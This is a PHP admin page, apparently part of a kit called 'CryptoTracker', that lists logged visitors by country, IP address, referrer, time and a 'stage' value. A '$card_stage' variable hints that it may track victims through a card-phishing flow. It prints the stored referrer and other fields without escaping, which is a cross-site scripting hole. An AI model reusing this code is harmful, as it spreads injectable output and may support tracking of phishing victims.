<?php
session_start();
require_once("../inc/config.inc.php");
require_once("../system/system.inc.php");
require_once("../inc/cryptodb.inc.php");
if(!isset($_SESSION['session'])) {
  header("Location: index.php");
  exit();
}
$card_stage = 0;
$total_visitors = 0;
$visitorsdb = new CryptoDB("db/visitors.cryptodb");
$rows = $visitorsdb->getRows("visitors");
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>CryptoTracker V 0.2</title>
    <link rel="stylesheet" href="assets/master.css" media="screen" title="no title" charset="utf-8">
    <link rel="stylesheet" href="assets/table.css" media="screen" title="no title" charset="utf-8">
    <script src="assets/master.js" charset="utf-8"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="assets/table.js" charset="utf-8"></script>
  </head>
  <body>
    <div class="menu">
      <ul>
        <li><a href="dashboard.php">Dashboard</a></li>
        <li class="active"><a href="visitors.php">Visitors</a></li>
        <li><a href="settings.php">Settings</a></li>
        <?php
        if($local_log) {
        ?>
        <li><a href="log.php">Local Log</a></li>
        <?php
        }
        ?>
        <li><a href="logout.php">Logout</a></li>
      </ul>
    </div>
    <div class="body">
      <section>
  <div class="tbl-header">
    <table cellpadding="0" cellspacing="0" border="0">
      <thead>
        <tr>
          <th>Country</th>
          <th>IP Address</th>
          <th>Referrer</th>
          <th>Date And Time</th>
          <th>Stage</th>
          <th>Actions</th>
        </tr>
      </thead>
    </table>
  </div>
  <div class="tbl-content">
    <table cellpadding="0" cellspacing="0" border="0">
      <tbody>
        <?php
        $i = 1;
        foreach($rows as $row) {
          $columns = $visitorsdb->getColumns($row);
          ?>
          <tr>
            <td><img src="flags/<?php echo $columns['country']; ?>.png" width="30px" /></td>
            <td><?php echo $columns['ip']; ?></td>
            <td><?php echo $columns['referrer']; ?></td>
            <td><?php echo $columns['datetime']; ?></td>
            <td><?php echo $columns['stage']; ?></td>
            <td><a href="delete.php?type=visitor&id=<?php echo $i; ?>">Delete</a></td>
          </tr>
          <?php
          $i++;
        }
        ?>
      </tbody>
    </table>
  </div>
</section>

    </div>
  </body>
</html>
